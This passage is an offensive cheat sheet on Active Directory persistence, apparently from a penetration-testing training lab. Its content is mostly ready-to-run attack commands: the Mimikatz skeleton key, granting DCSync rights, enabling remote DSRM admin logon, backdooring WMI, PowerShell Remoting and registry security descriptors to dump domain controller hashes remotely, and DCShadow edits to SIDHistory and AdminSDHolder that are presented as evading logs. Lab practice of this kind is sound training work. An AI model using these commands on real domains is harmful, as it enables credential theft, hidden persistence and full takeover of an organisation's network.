## DSRM Backdoor
- [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM) – Active Directory Security (adsecurity.org)](https://adsecurity.org/?p=1714)
- [Sneaky Active Directory Persistence #13: DSRM Persistence v2 – Active Directory Security (adsecurity.org)](https://adsecurity.org/?p=1785)
 *** 
 
 ## Forging Tickets
- Golden Ticket
- Silver Ticket

***

## Misc
- [Abusing RCBD](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

Must be run with DA privileges.

### Mimikatz skeleton key attack

Run from DC. Enables password “mimikatz” for all users 🚩.

```plaintext
privilege::debug
misc::skeleton
```

### Grant specific user DCSync rights with PowerView

Gives a user of your choosing the rights to DCSync at any time. May evade detection in some setups.

```powershell
Add-ObjectACL -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student355 -Rights DCSync
```

### Domain Controller DSRM admin

The DSRM admin is the local administrator account of the DC. Remote logon needs to be enabled first.

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

Now we can login remotely using the local admin hash dumped on the DC before (with `lsadump::sam`, see ‘Dumping secrets with Mimikatz’ below). Use e.g. ‘overpass the hash’ to get a session (see ‘Mimikatz’ above).

### Modifying security descriptors for remote WMI access

Give user WMI access to a machine, using `Set-RemoteWMI.ps1` cmdlet. Can be run to persist access to e.g. DCs.

```powershell
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2'
```

For execution, see ‘Command execution with WMI’ above.

### Modifying security descriptors for PowerShell Remoting access

Give user PowerShell Remoting access to a machine, using `Set-RemotePSRemoting.ps1` cmdlet. Can be run to persist access to e.g. DCs.

```powershell
Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

For execution, see ‘Command execution with PowerShell Remoting’ above.

### Modifying DC registry security descriptors for remote hash retrieval using DAMP

Using [DAMP toolkit](https://github.com/HarmJ0y/DAMP), we can backdoor the DC registry to give us access on the `SAM`, `SYSTEM`, and `SECURITY` registry hives. This allows us to remotely dump DC secrets (hashes).

We add the backdoor using the `Add-RemoteRegBackdoor.ps1` cmdlet from DAMP.

```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee Student355
```

Dump secrets remotely using the `RemoteHashRetrieval.ps1` cmdlet from DAMP (run as ‘Trustee’ user).

```powershell
# Get machine account hash for silver ticket attack
Get-RemoteMachineAccountHash -ComputerName dcorp-dc

# Get local account hashes
Get-RemoteLocalAccountHash -ComputerName dcorp-dc

# Get cached credentials (if any)
Get-RemoteCachedCredential -ComputerName dcorp-dc
```

### DCShadow

DCShadow is an attack that masks certain actions by temporarily imitating a Domain Controller. If you have Domain Admin or Enterprise Admin privileges in a root domain, it can be used for forest-level persistence.

Optionally, as Domain Admin, give a chosen user the privileges required for the DCShadow attack (uses `Set-DCShadowPermissions.ps1` cmdlet).

```powershell
Set-DCShadowPermissions -FakeDC mcorp-student35 -SamAccountName root355user -Username student355 -Verbose
```

Then, from any machine, use Mimikatz to stage the DCShadow attack.

```plaintext
# Set SPN for user
lsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"

# Set SID History for user (effectively granting them Enterprise Admin rights)
lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

# Set Full Control permissions on AdminSDHolder container for user
## Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

## Then get target user SID:
Get-NetUser -UserName student355 | select objectsid

## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109)
```

Finally, from either a DA session OR a session as the user provided with the DCShadowPermissions before, run the DCShadow attack. Actions staged previously will be performed without leaving logs 😈

```plaintext
lsadump::dcshadow /push
```
